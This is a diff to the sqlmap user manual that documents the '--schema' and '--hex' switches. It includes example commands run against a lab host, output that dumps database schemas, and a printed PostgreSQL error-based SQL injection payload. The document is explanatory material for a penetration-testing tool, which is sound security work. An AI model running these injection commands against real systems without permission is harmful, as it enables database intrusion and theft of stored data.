@@ -199,7 +199,7 @@
         --force-ssl         Force usage of SSL/HTTPS requests
         --forms             Parse and test forms on target URL
         --fresh-queries     Ignore query results stored in session file
-        --hex               Uses DBMS hex function(s) for data retrieval
+        --hex               Use DBMS hex function(s) for data retrieval
         --output-dir=ODIR   Custom output directory path
         --parse-errors      Parse and display DBMS error messages from responses
         --save              Save options to a configuration INI file
@@ -1014,7 +1014,62 @@ Note that on PostgreSQL you have to provide `public` or the name of a system dat
 
 Switch: `--schema`
 
-[TODO]
+User can retrieve a DBMS schema by using this switch. Schema listing will contain all databases, tables and columns, together with their respective types. In combination with `--exclude-sysdbs` only part of the schema containing non-system databases will be retrieved and shown.
+
+Example against a MySQL target:
+
+    $ python sqlmap.py -u "http://192.168.48.130/sqlmap/mysql/get_int.php?id=1" --schema --batch --exclude-sysdbs
+
+    [...]
+    Database: owasp10
+    Table: accounts
+    [4 columns]
+    +-------------+---------+
+    | Column      | Type    |
+    +-------------+---------+
+    | cid         | int(11) |
+    | mysignature | text    |
+    | password    | text    |
+    | username    | text    |
+    +-------------+---------+
+
+    Database: owasp10
+    Table: blogs_table
+    [4 columns]
+    +--------------+----------+
+    | Column       | Type     |
+    +--------------+----------+
+    | date         | datetime |
+    | blogger_name | text     |
+    | cid          | int(11)  |
+    | comment      | text     |
+    +--------------+----------+
+
+    Database: owasp10
+    Table: hitlog
+    [6 columns]
+    +----------+----------+
+    | Column   | Type     |
+    +----------+----------+
+    | date     | datetime |
+    | browser  | text     |
+    | cid      | int(11)  |
+    | hostname | text     |
+    | ip       | text     |
+    | referer  | text     |
+    +----------+----------+
+
+    Database: testdb
+    Table: users
+    [3 columns]
+    +---------+---------------+
+    | Column  | Type          |
+    +---------+---------------+
+    | id      | int(11)       |
+    | name    | varchar(500)  |
+    | surname | varchar(1000) |
+    +---------+---------------+
+    [...]
 
 ### Retrieve number of entries for table(s)
 
@@ -1561,6 +1616,24 @@ Provide sqlmap with `--forms` as well as the page where the form can be found as
 Switch: `--fresh-queries`
 
 As you are already familiar with the concept of a session file from the description above, it is good to know that you can ignore the content of that file using option `--fresh-queries`. This way you can keep the session file untouched and for a selected run, avoid the resuming/restoring of queries output. 
+
+### Use DBMS hex function(s) for data retrieval
+
+Switch: `--hex`
+
+In lost of cases retrieval of non-ASCII data requires special needs. One solution for that problem is usage of DBMS hex function(s). Turned on by this switch, data is encoded to it's hexadecimal form before being retrieved and afterwards unencoded to it's original form.
+
+Example against a PostgreSQL target:
+
+    $ python sqlmap.py -u "http://192.168.48.130/sqlmap/pgsql/get_int.php?id=1" -z "flu,bat,tec=E" --banner --hex -v 3 --parse-errors
+
+    [...]
+    [20:01:14] [INFO] fetching banner
+    [20:01:14] [PAYLOAD] 1 AND 5849=CAST((CHR(58)||CHR(118)||CHR(116)||CHR(106)||CHR(58))||(ENCODE(CONVERT_TO((COALESCE(CAST(VERSION() AS CHARACTER(10000)),(CHR(32)))),(CHR(85)||CHR(84)||CHR(70)||CHR(56))),(CHR(72)||CHR(69)||CHR(88))))::text||(CHR(58)||CHR(110)||CHR(120)||CHR(98)||CHR(58)) AS NUMERIC)
+    [20:01:15] [INFO] parsed error message: 'pg_query() [<a href='function.pg-query'>function.pg-query</a>]: Query failed: ERROR:  invalid input syntax for type numeric: ":vtj:506f737467726553514c20382e332e39206f6e20693438362d70632d6c696e75782d676e752c20636f6d70696c656420627920474343206763632d342e332e7265616c202844656269616e2032e332e322d312e312920342e332e32:nxb:" in <b>/var/www/sqlmap/libs/pgsql.inc.php</b> on line <b>35</b>'
+    [20:01:15] [INFO] retrieved: PostgreSQL 8.3.9 on i486-pc-linux-gnu, compiled by
+    GCC gcc-4.3.real (Debian 4.3.2-1.1) 4.3.2
+    [...]
 
 ### Update sqlmap
 
